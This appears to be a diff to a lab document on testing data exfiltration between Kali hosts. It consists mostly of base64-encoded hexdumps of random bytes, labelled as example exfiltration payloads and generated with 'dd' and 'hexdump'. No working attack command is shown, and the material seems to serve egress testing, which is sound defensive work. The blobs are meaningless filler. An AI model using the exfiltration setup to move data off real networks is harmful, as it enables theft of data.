+    ZCAzYiAzOSA2OSAgYWQgZTkgZmMgNGMgZjUgMTAgY2IgY2UgIHwuLi4ufTs5aS4uLkwuLi4u
+    fAowMDAwMDg2MCAgZGIgMzYgNmYgOGYgNDUgMzYgODIgOGUgIGQ0IGFkIDQ1IGY2IDMwIDNm
+    IDBjIDIxICB8LjZvLkU2Li4uLkUuMD8uIXwKMDAwMDA4NzAgIDQ0IDhiIDc1IGM5IGQxIDA3
+    IGU3IDgwICAzOCA5NCAzNCA3YSBhOSBhZiA0MSBmMSAgfEQudS4uLi4uOC40ei4uQS58CjAw
+    MDAwODgwICA1OCAzZSAxNiA1ZiBhZSBlYSBjMiA2MiAgOTEgZGYgNGMgMzAgZWIgMTIgZDEg
+    MTggIHxYPi5fLi4uYi4uTDAuLi4ufAowMDAwMDg5MCAgZDYgOGMgZTYgODkgZTkgZGMgMjIg
+    NzAgIDE1IDU0IDBjIDI5IGE5IGE0IDg1IDVkICB8Li4uLi4uInAuVC4pLi4uXXwKMDAwMDA4
+    YTAgIDM4IDE4IGFjIGUxIGQ3IDBjIGU1IDJiICA0YiA3MiA2NiBkYiAyZCBkYyAwOSAzOCAg
+    fDguLi4uLi4rS3JmLi0uLjh8CjAwMDAwOGIwICBmMSAwMiA5YSBhNSAzOCA0YyBiOCAyZSAg
+    ZmUgNjggYjYgOWMgZTMgOGMgMWYgZGUgIHwuLi4uOEwuLi5oLi4uLi4ufAowMDAwMDhjMCAg
+    YWQgMDggMzcgMmUgODYgZDIgZjQgYmYgIGM1IGQ1IDY3IGE5IDM2IDFlIDVkIDk5ICB8Li43
+    Li4uLi4uLmcuNi5dLnwKMDAwMDA4ZDAgIDI3IDliIGZlIDk0IDM1IGQ5IDgxIGYxICAwNCBl
+    NiBhYiA0MyA2ZSA1NSA2MyA4ZCAgfCcuLi41Li4uLi4uQ25VYy58CjAwMDAwOGUwICBjOSBl
+    NSA3ZiBiNiAzOSA1MiBkZSAwMiAgYTcgYWMgNmUgOWQgNDQgYmEgOGQgZWYgIHwuLi4uOVIu
+    Li4ubi5ELi4ufAowMDAwMDhmMCAgNjYgMjAgMzIgNGIgNDcgYmMgMjMgOWEgIDJjIDU5IDM0
+    IDYzIDYwIGI1IDg5IDI5ICB8ZiAyS0cuIy4sWTRjYC4uKXwKMDAwMDA5MDAgIDIyIDRiIDEx
+    IDYwIDFlIDdhIGJiIGFkICA3ZiA3YiAzNCAyZCA3ZCAxYiAxMSBhNiAgfCJLLmAuei4uLns0
+    LX0uLi58CjAwMDAwOTEwICA3ZSA3NyA1ZSBkOCAxYyBiNiAyZCA4MyAgNDMgZDAgYzAgNGIg
+    ZmMgZGUgMTMgNTggIHx+d14uLi4tLkMuLksuLi5YfAowMDAwMDkyMCAgMjQgNWYgM2MgNzEg
+    OTQgNjggNTEgNWQgIDhlIDllIDBkIDk0IDQyIGFmIDM5IDY4ICB8JF88cS5oUV0uLi4uQi45
+    aHwKMDAwMDA5MzAgIGI1IDVkIDkyIDFlIGM3IDE4IGY1IGY0ICBmZSA1OSBlNCA2ZSBhOCA2
+    OCBlZSAzZSAgfC5dLi4uLi4uLlkubi5oLj58CjAwMDAwOTQwICA4MCA5ZSBiYiAwMiAxYSBk
+    YyA5MCAwMiAgMmIgYWQgMmMgODAgMTcgNWYgODggMDkgIHwuLi4uLi4uLisuLC4uXy4ufAow
+    MDAwMDk1MCAgODUgMGYgNjEgOTEgMGQgODIgYWEgZTQgIDc3IDY0IDdhIDA4IDE2IGU2IGNm
+    IDNlICB8Li5hLi4uLi53ZHouLi4uPnwKMDAwMDA5NjAgIDVjIGUzIGVhIGE4IDJmIGM4IGFm
+    IGZmICAwOCA5YSAyMiA3OCA5YyAyNyA1ZSA0YyAgfFwuLi4vLi4uLi4ieC4nXkx8CjAwMDAw
+    OTcwICBlYiBkYiBmMyAwYSA2MSBmZiBmNCBiMiAgMzkgNmEgZjkgYmMgZTMgNjMgNDkgZDcg
+    IHwuLi4uYS4uLjlqLi4uY0kufAowMDAwMDk4MCAgYTUgMmEgYjMgOWIgZTAgNTYgN2YgZGEg
+    IDQ4IDhhIDhlIDc0IDVlIDk2IDhhIGMwICB8LiouLi5WLi5ILi50Xi4uLnwKMDAwMDA5OTAg
+    IDY5IGZjIDg3IGQ5IDUxIDYyIDI5IDcxICAzYiBmMyAzYyBlNiA5ZSA1OSAxMCAyYiAgfGku
+    Li5RYilxOy48Li5ZLit8CjAwMDAwOWEwICBiZiBkNCA2MyA5NiBmZiA5ZSBiYSAwNSAgMDIg
+    YmQgOWUgNTkgNTEgZGMgODYgNjIgIHwuLmMuLi4uLi4uLllRLi5ifAowMDAwMDliMCAgY2Eg
+    YTcgMzAgYTcgMzIgYzkgYmIgZDYgIGIxIGI5IDg1IGJkIDI0IGRmIGU5IGRlICB8Li4wLjIu
+    Li4uLi4uJC4uLnwKMDAwMDA5YzAgIDdiIDdkIDZjIGVjIDE2IGI5IDk5IDU5ICBiZiA4NCBk
+    YSBlYSAxNCA3MSA3OCBhNiAgfHt9bC4uLi5ZLi4uLi5xeC58CjAwMDAwOWQwICAxMSA5NSBm
+    YSBlMiBiZCBmYSBhMyBlMSAgMTIgNzAgZDYgMjIgMDggN2YgY2YgMTMgIHwuLi4uLi4uLi5w
+    LiIuLi4ufAowMDAwMDllMCAgN2YgYWEgZjkgNTQgYzggNzggZjQgYjEgIDJiIDMxIGQ5IDRl
+    IGI2IDQzIDhmIGYxICB8Li4uVC54Li4rMS5OLkMuLnwKMDAwMDA5ZjAgIDExIDA5IDhkIDdh
+    IDVjIDY4IDlmIGU4ICAyZiAxMCAyYyA5MCAyMCBiOCAxZSAxNyAgfC4uLnpcaC4uLy4sLiAu
+    Li58CjAwMDAwYTAwICA0ZCBkMyBkNyA4NiA5YiAwYSAxNyBkYiAgMGYgMzIgZmEgZTggNDgg
+    MDYgM2EgYmIgIHxNLi4uLi4uLi4yLi5ILjoufAowMDAwMGExMCAgYjQgZWYgNDkgMTEgNWQg
+    OTAgYjMgYTIgIGMxIGYxIGIzIDM5IDRjIDkwIDU5IDIwICB8Li5JLl0uLi4uLi45TC5ZIHwK
+    MDAwMDBhMjAgIDEzIDFmIDEwIDQwIDZhIGM2IDgyIGVlICBjNyA0OSBiMCAyMCAxNSBlYSAz
+    NCA5YyAgfC4uLkBqLi4uLkkuIC4uNC58CjAwMDAwYTMwICAwMSA0MyA4YiAwNiBmMiA4OCBj
+    ZCBlZCAgZjEgOTcgOTQgODkgYWYgOWMgZTEgYjggIHwuQy4uLi4uLi4uLi4uLi4ufAowMDAw
+    MGE0MCAgZjMgZGIgNzYgMzkgMTUgZmQgMGQgNDIgIGQxIGIzIDIyIGUwIDI5IDBhIDNjIDgx
+    ICB8Li52OS4uLkIuLiIuKS48LnwKMDAwMDBhNTAgIDRlIGMwIDAyIGJiIDRhIDBiIGFmIGJl
+    ICA3OSA2YiA3MSA1OSA4MiAzOSAyNSBmYiAgfE4uLi5KLi4ueWtxWS45JS58CjAwMDAwYTYw
+    ICAyMCAwNCA5MiA1OSBmNiA1ZCA3MiBjYyAgYWIgZTcgNjEgNmQgNmUgODUgZjcgNzQgIHwg
+    Li5ZLl1yLi4uYW1uLi50fAowMDAwMGE3MCAgNDMgZDkgM2MgMTkgZDggZDEgNmUgZmYgIDY5
+    IDgzIGQwIGIwIGNmIGZiIDc0IGM0ICB8Qy48Li4ubi5pLi4uLi50LnwKMDAwMDBhODAgIDlk
+    IDNkIGZiIDk5IDkxIDFlIGY4IGVlICBiNiBmNyAwMiBiNCBmMyBlYSAwOCA4YyAgfC49Li4u
+    Li4uLi4uLi4uLi58CjAwMDAwYTkwICA0YyA2MiBhZiA2MyAwMiA0MCBmNyAwOSAgZGUgNTUg
+    ZTkgMTcgNDggN2UgYzkgZDggIHxMYi5jLkAuLi5VLi5Ifi4ufAowMDAwMGFhMCAgOTQgYzIg
+    NzQgNmYgZGIgYzYgMGIgN2QgIGFmIGE5IGJkIDBlIDNkIDllIGE0IDViICB8Li50by4uLn0u
+    Li4uPS4uW3wKMDAwMDBhYjAgIGUzIDY4IGRiIGJiIGFjIGMzIDY4IDk4ICAyOSAwZCAxYiAy
+    MiBiMyBkYiAzOCAwZSAgfC5oLi4uLmguKS4uIi4uOC58CjAwMDAwYWMwICBmMCBiMCBkYiBj
+    NSA5ZSBlYSAwOSA0NCAgZjUgNTQgMWYgN2QgOTYgZTUgNTMgMWQgIHwuLi4uLi4uRC5ULn0u
+    LlMufAowMDAwMGFkMCAgYWMgZTUgZWQgMzYgMTkgZmIgYzQgNGMgIDcyIDhmIGRiIDM3IGE2
+    IDczIDJlIGQ1ICB8Li4uNi4uLkxyLi43LnMuLnwKMDAwMDBhZTAgIDI1IDBhIDE1IGQzIDNh
+    IDA1IGVhIDQ4ICAxZiA4NyAzMiBhOCBlOCBkNyAxZCA1MCAgfCUuLi46Li5ILi4yLi4uLlB8
+    CjAwMDAwYWYwICA3MiA4ZSAxZSBiNSA0ZiBmNiBhYyA4ZiAgNDcgMWQgYTcgNTQgNDIgMzMg
+    NGEgMDggIHxyLi4uTy4uLkcuLlRCM0oufAowMDAwMGIwMCAgOTggNDIgMGYgZTkgMWYgZWMg
+    Y2EgYjAgIDAyIDdhIDBjIGI5IGI5IDU4IDEzIDk3ICB8LkIuLi4uLi4uei4uLlguLnwKMDAw
+    MDBiMTAgIGZhIDk4IDFkIDI0IDhiIDFjIDU1IDc5ICA3YiAxNCA1YyA3MyA0ZCAwNCAxNCAw
+    MSAgfC4uLiQuLlV5ey5cc00uLi58CjAwMDAwYjIwICA5NCBmOSA4MyBmNyAwYyBjMCAwZiA4
+    OCAgNjkgYzkgYTMgOWQgZWUgNTAgNTIgYzEgIHwuLi4uLi4uLmkuLi4uUFIufAowMDAwMGIz
+    MCAgYjYgZTUgNTcgOTAgNjMgNTYgMzQgMzkgIGE3IDM3IGI3IGI4IDZiIDBkIGI4IDM1ICB8
+    Li5XLmNWNDkuNy4uay4uNXwKMDAwMDBiNDAgIGU5IDBjIDYzIDU3IDE4IDE2IDY1IDE3ICAy
+    NiBkNSAxYiAxNyA5MSBjZSA5OSA0ZCAgfC4uY1cuLmUuJi4uLi4uLk18CjAwMDAwYjUwICBh
+    NyA5ZSAxOSBkZCBkOCA4NyAzMSBhZCAgMDIgNWYgMzkgYzQgYjQgNGYgMDcgZDcgIHwuLi4u
+    Li4xLi5fOS4uTy4ufAowMDAwMGI2MCAgNDAgNDEgMjYgNmYgMDkgZTIgYWQgOTMgIGIxIDYw
+    IDU4IGVkIGFkIGEwIGI1IGFmICB8QEEmby4uLi4uYFguLi4uLnwKMDAwMDBiNzAgIGVmIDk0
+    IDk0IGYwIGE2IGFiIDM5IDEzICAzZCBlMSAwNyBmMCBlZCA3NiBkNiBmZiAgfC4uLi4uLjku
+    PS4uLi52Li58CjAwMDAwYjgwICA1MyBhZSBiMyA5YyBlYSBmNiAzNyBmZiAgYjUgZjggYTgg
+    OTAgYjEgM2UgNDQgOTAgIHxTLi4uLi43Li4uLi4uPkQufAowMDAwMGI5MCAgY2EgNjIgM2Eg
+    MzggNjMgZWMgMTMgNmMgIGM3IDlhIDA1IDdhIDVlIGM4IGYzIDY5ICB8LmI6OGMuLmwuLi56
+    Xi4uaXwKMDAwMDBiYTAgIDczIDZhIDI4IDNhIGJlIGY3IGY2IDNmICA3ZSAxMyBkNCBjNyBl
+    ZSA1YSA4YyA1NiAgfHNqKDouLi4/fi4uLi5aLlZ8CjAwMDAwYmIwICBhNyA5YyA2ZiA0YiBh
+    NSA4NiBlMSA4YyAgZDcgMDMgMmQgNDQgOWUgYjggNDkgODMgIHwuLm9LLi4uLi4uLUQuLkku
+    fAowMDAwMGJjMCAgMWEgMGIgMzYgYWUgM2QgMTkgYWMgMjEgIGVlIDIwIDQwIGQxIGYxIDIy
+    IDYyIDg3ICB8Li42Lj0uLiEuIEAuLiJiLnwKMDAwMDBiZDAgIDY0IDM4IGMxIDE0IDY2IDUz
+    IGJlIDY5ICBhOSA0NCA4ZiBjYSA5MSBjMiBmZiAwNiAgfGQ4Li5mUy5pLkQuLi4uLi58CjAw
+    MDAwYmUwICBhNiAwYyA0MyAwYiA4MCBiZCAxOCAyOSAgYjkgY2QgNTYgOTAgNjcgNmMgMmQg
+    Y2EgIHwuLkMuLi4uKS4uVi5nbC0ufAowMDAwMGJmMCAgZTcgZjMgMjIgMGUgMzIgOGUgZDEg
+    Y2YgIDBlIGY5IDA3IDcxIDllIGM2IDdhIDYzICB8Li4iLjIuLi4uLi5xLi56Y3wKMDAwMDBj
+    MDAgIGE4IDVkIDI2IGUxIGQ4IDliIGVmIGE5ICAxMiA1MiA1MCBiYyAxOSBkZiBhNCA5NiAg
+    fC5dJi4uLi4uLlJQLi4uLi58CjAwMDAwYzEwICA5MyAxMSA4MSA3NiA4OSAzZiBmOSBjMiAg
+    M2EgZjIgYmMgMmIgNjAgYjUgY2QgOWIgIHwuLi52Lj8uLjouLitgLi4ufAowMDAwMGMyMCAg
+    YTIgOWEgNDggNzkgNWUgZDQgODMgZWQgIDg1IGFjIDI5IDE0IDYwIDI3IDNiIDBjICB8Li5I
+    eV4uLi4uLikuYCc7LnwKMDAwMDBjMzAgIDllIGUwIGZiIGNlIGIxIDMwIGMwIGVlICBmMSBl
+    YyAzOCA2NiA2YSBiNiA0MSBhNSAgfC4uLi4uMC4uLi44ZmouQS58CjAwMDAwYzQwICAzOCAx
+    MyA5MyA3NyBiNyA4NSBjZiAzYiAgNDEgNGYgOTEgZjUgZDIgZjUgNTQgMjUgIHw4Li53Li4u
+    O0FPLi4uLlQlfAowMDAwMGM1MCAgZWIgNWQgMjkgMTIgMjMgY2EgMWMgZWIgIDNmIDhkIGU4
+    IDcwIDM1IGE0IDZkIDE1ICB8Ll0pLiMuLi4/Li5wNS5tLnwKMDAwMDBjNjAgIGQ4IGM5IGQ1
+    IDJiIGVlIDU2IGJkIDZiICBjMiBiYyAyMSA1MyAwMiBiZiA0OCAyOSAgfC4uLisuVi5rLi4h
+    Uy4uSCl8CjAwMDAwYzcwICBiNyBkOSAwYSBiMCA0NiBmOSA5ZSA5MSAgZjEgMWQgMTcgZmIg
+    YTcgMmIgNDAgODEgIHwuLi4uRi4uLi4uLi4uK0AufAowMDAwMGM4MCAgYzggNzMgMDUgYjQg
+    NDggMGEgOGIgOWEgIDM4IDFhIGUwIDZlIDIzIGZlIDg3IDJmICB8LnMuLkguLi44Li5uIy4u
+    L3wKMDAwMDBjOTAgIDFkIDc1IDBkIGI0IDJlIDcyIDZjIGI3ICAwNCBmZCBhZCAxNiBkZCBj
+    YyAwOCA2ZSAgfC51Li4ucmwuLi4uLi4uLm58CjAwMDAwY2EwICAxMCA1NSAxYiBjZCA0NCA4
+    ZCBmYiBlZCAgMDMgZDkgYmIgNTggMDUgMDcgY2QgYTUgIHwuVS4uRC4uLi4uLlguLi4ufAow
+    MDAwMGNiMCAgZWQgMmQgNzMgNTQgODEgZjAgMGQgZTcgIGQ5IGY2IGZlIDdjIGQyIDJjIDdk
+    IDIxICB8Li1zVC4uLi4uLi58Lix9IXwKMDAwMDBjYzAgIDM3IDMzIDE2IDVhIDA0IGJhIGE3
+    IDNkICA5NSAzZCAxOCA0ZSA3YiBhYSA5YSAxYiAgfDczLlouLi49Lj0uTnsuLi58CjAwMDAw
+    Y2QwICBiZCA4NyAwOSA3NiA4OSBlYiA0NyA2MiAgOGEgNjggZDYgOGEgYTcgZjcgMzkgODUg
+    IHwuLi52Li5HYi5oLi4uLjkufAowMDAwMGNlMCAgYmYgOTggZDEgMDMgZjAgMDcgZmUgYTgg
+    IGNkIDg2IDQ4IDcwIDMwIDFlIDJmIDMyICB8Li4uLi4uLi4uLkhwMC4vMnwKMDAwMDBjZjAg
+    IGMzIGFlIGE0IGI4IDhjIGIwIDQwIDcxICBiNCBmYyBhOCAwZSA4ZiBlMSA1ZSBjNiAgfC4u
+    Li4uLkBxLi4uLi4uXi58CjAwMDAwZDAwICA3MSBlZSA5OSA0NSBiNiBiOCAzZCA5NyAgMmQg
+    OTIgOGYgMGUgYmYgODYgNDMgMzIgIHxxLi5FLi49Li0uLi4uLkMyfAowMDAwMGQxMCAgOWYg
+    MmMgYzMgMTggYWMgMDMgYWMgMGEgIGM3IGIyIGY1IDg4IDFlIDkxIGFlIDM2ICB8LiwuLi4u
+    Li4uLi4uLi4uNnwKMDAwMDBkMjAgIGQzIGQwIDc1IGJlIGU0IDU3IGY2IDllICBkYyA1MyA0
+    ZSA4NCBiMCBkNyAwNCA3MSAgfC4udS4uVy4uLlNOLi4uLnF8CjAwMDAwZDMwICAxMSAyMCBl
+    OSBlOSBlMyBjMCBmOSA5NSAgNjUgYzcgNzkgMzggZTEgOTQgNzcgNjUgIHwuIC4uLi4uLmUu
+    eTguLndlfAowMDAwMGQ0MCAgZWIgN2QgM2MgODQgYmUgYTYgZmIgYTYgIGJmIGIxIGFlIGQz
+    IGU3IDdjIGViIGI2ICB8Ln08Li4uLi4uLi4uLnwuLnwKMDAwMDBkNTAgIDM4IDBmIDNmIGNm
+    IDMyIGIwIGE4IDRmICBiOCBhZSA0ZCA4MCAyNSA0ZCBmYiA1MyAgfDguPy4yLi5PLi5NLiVN
+    LlN8CjAwMDAwZDYwICA0MCA3ZSA2OCAzYSA2MSAzOCAzMyA0MiAgZjAgZGQgZTMgMTYgMjYg
+    ODggYjkgNjIgIHxAfmg6YTgzQi4uLi4mLi5ifAowMDAwMGQ3MCAgNTYgZjcgYjMgZDcgZGMg
+    ZjcgYjYgM2YgIDNkIDM5IDAyIDk0IGM5IDNlIGJmIGZiICB8Vi4uLi4uLj89OS4uLj4uLnwK
+    MDAwMDBkODAgIDVkIGZlIDE0IDAwIDVhIDQzIDQ3IDJhICAxNCBjNiAzOCBjZSA3MiAwMSA3
+    NyBlZiAgfF0uLi5aQ0cqLi44LnIudy58CjAwMDAwZDkwICA2NSAxOSA1ZCA0NCA3ZSA2MSBl
+    YSA5YSAgNWYgZDggMDcgNzMgMDYgNzYgODMgMmQgIHxlLl1EfmEuLl8uLnMudi4tfAowMDAw
+    MGRhMCAgYTYgOTYgNTMgNzggMWUgZmMgNzUgYTEgIDY3IGU3IDE4IDgwIDllIDc3IGI3IGQ4
+    ICB8Li5TeC4udS5nLi4uLncuLnwKMDAwMDBkYjAgIGJhIGJmIGEyIDlmIDljIGM4IDE5IDUy
+    ICA4ZCA2NiBiNCA4MiBiMCA0NSA3ZSA5OSAgfC4uLi4uLi5SLmYuLi5Ffi58CjAwMDAwZGMw
+    ICAwMSBlMSA2NCA3MCBiNiA4ZCBkNiA5NyAgZTkgMjEgNTYgZWMgMjUgZTIgYzEgMTQgIHwu
+    LmRwLi4uLi4hVi4lLi4ufAowMDAwMGRkMCAgNjcgZGEgZmIgZWEgYTMgNjggOTkgMzcgIGMx
+    IGM2IDAzIGJkIGQ4IDM2IDA4IDU0ICB8Zy4uLi5oLjcuLi4uLjYuVHwKMDAwMDBkZTAgIDRh
+    IDU5IGExIDRkIGE1IDBhIDdlIDQ4ICBkMCA2ZiA3ZCBiNiAzYiBjNyA3YSAyMSAgfEpZLk0u
+    Ln5ILm99LjsueiF8CjAwMDAwZGYwICBiMCAzZCA5NCAyYyBhZSA4OSBiZCAwNiAgODEgOTcg
+    ODggMTYgYzkgMGUgNDcgMDggIHwuPS4sLi4uLi4uLi4uLkcufAowMDAwMGUwMCAgOWEgNWEg
+    OWMgMTQgN2MgMTAgY2YgZjMgIGJhIGFmIDc3IDM5IGYzIDQ4IGQyIDdmICB8LlouLnwuLi4u
+    Lnc5LkguLnwKMDAwMDBlMTAgIGY1IGQ2IDIwIDQ3IGUxIDk3IDM5IDM4ICBjMSBiYiBjOSA1
+    YyA0NSA3OSBkZCBiOCAgfC4uIEcuLjk4Li4uXEV5Li58CjAwMDAwZTIwICAxNiBiNyA2NSBi
+    YSBmNSA0MSAyZiA0ZCAgMGYgYTkgNzAgOTEgOGIgYmIgZmMgN2YgIHwuLmUuLkEvTS4ucC4u
+    Li4ufAowMDAwMGUzMCAgNzkgYWYgNmUgNDggOWUgOGUgMDQgZDAgIDRiIGZmIDRlIGRhIDMz
+    IDdiIDNlIDQ4ICB8eS5uSC4uLi5LLk4uM3s+SHwKMDAwMDBlNDAgIDlmIDU3IGZmIDQ3IGNm
+    IDAxIGE4IDg4ICA3MyA3ZSBhNCBhOSA5MiBkMCBlOSAxNSAgfC5XLkcuLi4uc34uLi4uLi58
+    CjAwMDAwZTUwICBkYyAxYyA3OCA4OCBhZSBlMyA2OCBjZiAgNTMgZTQgMjUgZmMgZjggYzgg
+    MzAgZDMgIHwuLnguLi5oLlMuJS4uLjAufAowMDAwMGU2MCAgNjEgYzcgNWMgMDMgNzggMWEg
+    N2IgMTggIDViIDVjIGEwIGFkIDg0IGE1IGZmIDBkICB8YS5cLnguey5bXC4uLi4uLnwKMDAw
+    MDBlNzAgIDYyIDE0IGMxIDAwIDRkIDJhIDYwIGIzICBkNCA3OCA5NyBiNiAyZiAxMSA4ZCA2
+    NCAgfGIuLi5NKmAuLnguLi8uLmR8CjAwMDAwZTgwICAyNiA4YiA5OCBhYSBmOCA0YiAxMiBh
+    NSAgYmIgZjUgODUgNGEgYWIgODggZGYgZjkgIHwmLi4uLksuLi4uLkouLi4ufAowMDAwMGU5
+    MCAgYzQgYmIgNTAgMjUgZDYgNjUgYTggZTQgIDcwIGJlIDI0IDY0IGY2IGYxIGEyIDRlICB8
+    Li5QJS5lLi5wLiRkLi4uTnwKMDAwMDBlYTAgIDI4IDcwIGJhIGZlIDEwIGM1IDM1IDAwICAx
+    NyA0YiBmNyA3MSA5MSA2YiBmMCAyMCAgfChwLi4uLjUuLksucS5rLiB8CjAwMDAwZWIwICBh
+    NiA2MiBkZSA0MiA0OCA1NyAzZSAzNCAgZTggZGQgNWUgZmMgY2QgMWEgZDUgNzIgIHwuYi5C
+    SFc+NC4uXi4uLi5yfAowMDAwMGVjMCAgMzUgNGUgYmIgM2EgNjYgN2YgODQgOTkgIDNmIGI1
+    IGI1IDg0IDUyIDkyIGM3IGY5ICB8NU4uOmYuLi4/Li4uUi4uLnwKMDAwMDBlZDAgIDkxIGQ5
+    IGRjIGQ1IDBmIGU2IGYyIGI4ICBmOSAzZiA2ZSBhOCBjZSBjNCA5MiA5NiAgfC4uLi4uLi4u
+    Lj9uLi4uLi58CjAwMDAwZWUwICA4ZSAyYyAwNiBjNyBjYiA1OSBmNiBjOCAgMDEgMmMgOTMg
+    MjcgYjYgYWUgMmEgMjIgIHwuLC4uLlkuLi4sLicuLioifAowMDAwMGVmMCAgZTEgMDUgOTQg
+    NTAgM2IgYjAgYjUgZWMgIDYwIGE0IDBlIGJlIGUxIGZhIGVlIDU2ICB8Li4uUDsuLi5gLi4u
+    Li4uVnwKMDAwMDBmMDAgIGE5IDM0IDljIGYwIGI1IGZkIDc2IDA1ICA2MCA2ZSBmZCBlMSAx
+    MCA5MCA5NyBlNCAgfC40Li4uLnYuYG4uLi4uLi58CjAwMDAwZjEwICA1ZSBlZiA0MyA1MCBk
+    MiA5NyBlNyBlYyAgNTYgYmQgNjIgOTAgZWYgYjAgOTEgOTAgIHxeLkNQLi4uLlYuYi4uLi4u
+    fAowMDAwMGYyMCAgNzMgMDQgODMgOGMgYzUgMTAgYWIgYWEgIDFiIGRjIDFlIGVhIGNkIGJi
+    IDQ2IDI0ICB8cy4uLi4uLi4uLi4uLi5GJHwKMDAwMDBmMzAgIGYxIDI1IDg2IDMzIDMyIGRk
+    IDY3IDdlICA2ZiA1NyAzMSBmNyBlOCA0NSBlNyAxZSAgfC4lLjMyLmd+b1cxLi5FLi58CjAw
+    MDAwZjQwICAxNCA3ZCA2NiA2ZiA0MCBlMSAwOSA1NSAgZjcgM2IgYTUgNmUgNTUgOTIgNDgg
+    YmIgIHwufWZvQC4uVS47Lm5VLkgufAowMDAwMGY1MCAgZmQgMWUgMTIgODIgZGEgYWMgODUg
+    NTYgIGZjIDA5IDRhIGZiIDY4IDU3IDc0IDVmICB8Li4uLi4uLlYuLkouaFd0X3wKMDAwMDBm
+    NjAgIGU5IDhiIDhjIDFhIDJkIGI1IDgxIGY1ICBlYSBkZCAyMSA4OSAwZCBkMCA2OCA3YyAg
+    fC4uLi4tLi4uLi4hLi4uaHx8CjAwMDAwZjcwICA4MSA0ZiBiMCA0YSAxOCA4NSA5MSBkMSAg
+    NjQgYjAgOWUgMDEgMjAgY2IgMzYgZGMgIHwuTy5KLi4uLmQuLi4gLjYufAowMDAwMGY4MCAg
+    NTYgMWYgNmUgNTQgMTggYjQgOGUgYTQgIGJkIGNiIGNlIGYyIDE4IDBhIGEyIGY4ICB8Vi5u
+    VC4uLi4uLi4uLi4uLnwKMDAwMDBmOTAgIGQ2IDEzIGQwIDk4IDdlIDFhIGMzIGFjICBlMyBl
+    NiAwYiA0YyBiMyA4YiA3ZiA1MCAgfC4uLi5+Li4uLi4uTC4uLlB8CjAwMDAwZmEwICBmZCBl
+    NCA0MSBiNyBlYiAxYSBkMiAwZSAgNmEgYjQgOWYgNWUgNTYgMDEgYWUgNzYgIHwuLkEuLi4u
+    LmouLl5WLi52fAowMDAwMGZiMCAgMTUgNTIgYTUgYmIgYTIgZGQgMWIgYTIgIDIwIGM2IDM5
+    IDc1IGRlIDhkIDU5IDA2ICB8LlIuLi4uLi4gLjl1Li5ZLnwKMDAwMDBmYzAgIGIyIGM1IGMy
+    IDhlIDY5IDBiIDA3IDIzICBiNCBiOSAzMCBlZCAyZiBlYSAwZiA1NCAgfC4uLi5pLi4jLi4w
+    Li8uLlR8CjAwMDAwZmQwICAxMyBjNCA4NiA2OSAwZSBjMyBlMSA2ZCAgMTQgMzQgOWMgYzgg
+    MTYgOTEgMmQgNzEgIHwuLi5pLi4ubS40Li4uLi1xfAowMDAwMGZlMCAgNzEgMDUgYWUgZDQg
+    ZjcgM2MgYjIgZGYgIDMyIDNiIGYyIGExIDIyIGYwIGJjIDU2ICB8cS4uLi48Li4yOy4uIi4u
+    VnwKMDAwMDBmZjAgIDgxIDVhIGFlIDliIDgwIDU5IGUyIDdmICAwZSBkZiBhYSBhOCBjMiBi
+    MSBkNCAzYiAgfC5aLi4uWS4uLi4uLi4uLjt8CjAwMDAxMDAwICBjOCBmZSAxOCAwMyBlYiA4
+    NCAyOCAxYSAgMjMgYzIgMGMgZGYgYzQgZmEgNjAgNDQgIHwuLi4uLi4oLiMuLi4uLmBEfAow
+    MDAwMTAxMCAgN2MgNmEgZjEgMTcgY2UgM2QgYzQgZWQgIDUyIGMxIDk0IDM1IDA2IGQ3IDQ2
+    IGY5ICB8fGouLi49Li5SLi41Li5GLnwKMDAwMDEwMjAgIDE1IDIzIGU5IDY2IDQyIDUwIDA5
+    IDRmICAxMyA2YSA0NSAzNCA4ZCBmMSBlMiBjNCAgfC4jLmZCUC5PLmpFNC4uLi58CjAwMDAx
+    MDMwICA0ZiBkMyA2YyA3OSA5YSBhOCBmZSBiZCAgNzAgM2MgODQgODQgNzIgMjAgZDkgZTcg
+    IHxPLmx5Li4uLnA8Li5yIC4ufAowMDAwMTA0MCAgNmMgZjcgOWYgNWMgNDkgNWYgMzIgMTIg
+    IDU3IGI0IDJiIDUwIGQ1IDUxIDY2IDJmICB8bC4uXElfMi5XLitQLlFmL3wKMDAwMDEwNTAg
+    IGE5IDEyIDRiIDE0IDE2IGU3IDA4IDFiICA4ZiBmZCA0NiAzNSAwMyBmMCA1NCA5OCAgfC4u
+    Sy4uLi4uLi5GNS4uVC58CjAwMDAxMDYwICAyMCAwNyAwNSA4MiA4ZiAwNSBlYiBjZiAgZmMg
+    YjMgZTggMmMgNDcgZDQgNTMgMDcgIHwgLi4uLi4uLi4uLixHLlMufAowMDAwMTA3MCAgNGEg
+    NzIgMmEgMmUgNWYgOGIgYWIgYWYgIDBjIDc4IGVlIGFlIGU2IDNhIGQxIDNkICB8SnIqLl8u
+    Li4ueC4uLjouPXwKMDAwMDEwODAgIDI1IDIwIDk3IGMxIDIwIDliIGUzIGQ1ICA0NSBlNSBl
+    ZCAxYyBlYyA2MCA2NSAxNyAgfCUgLi4gLi4uRS4uLi5gZS58CjAwMDAxMDkwICBmZSBiNSBh
+    NCA4YSBjMyBlOCBjZCA1ZCAgMmEgYjcgNzAgNmMgMTggMWQgYjAgZWYgIHwuLi4uLi4uXSou
+    cGwuLi4ufAowMDAwMTBhMCAgMWQgMmEgZTIgMjcgOTIgZjIgZTIgZjAgIDkzIDE1IDIzIDhi
+    IDI2IDRhIGM0IDUyICB8LiouJy4uLi4uLiMuJkouUnwKMDAwMDEwYjAgIDJmIDIwIGEwIDA3
+    IDNiIDIwIDNiIDU0ICBmMCAyOCAxZiAxZiAzNiBmOCA3YSBjNiAgfC8gLi47IDtULiguLjYu
+    ei58CjAwMDAxMGMwICBjMyA5ZCAxMSA5OCAzMCA4OSBmZSBmOCAgYjMgMGYgMTIgZWQgNjMg
+    ZTgKCg==
+    kali-lan-client#
+
+### Example payload for the Exfiltration of data using UDP and any port to any IP
+
+This example payload was generated using `dd` and `hexdump -C` (e.g.: `dd if=/dev/urandom bs=1M count=1 | hexdump -C > exfiltration-udp-2`).
+
+    kali-wan-server% base64 exfiltration-udp-2
+    MDAwMDAwMDAgIDQ0IDY4IDI2IDlhIDcyIGU0IDIzIDBlICA2NyBjMCA3YyA5YyA1ZSA3MSBlYiA2
+    OCAgfERoJi5yLiMuZy58Ll5xLmh8CjAwMDAwMDEwICA3OSBjYiBhOCBhMiA3OCAwOSA5OSA2NiAg
+    YmYgODIgYjQgN2EgMGQgZDYgOGIgMWQgIHx5Li4ueC4uZi4uLnouLi4ufAowMDAwMDAyMCAgZTkg
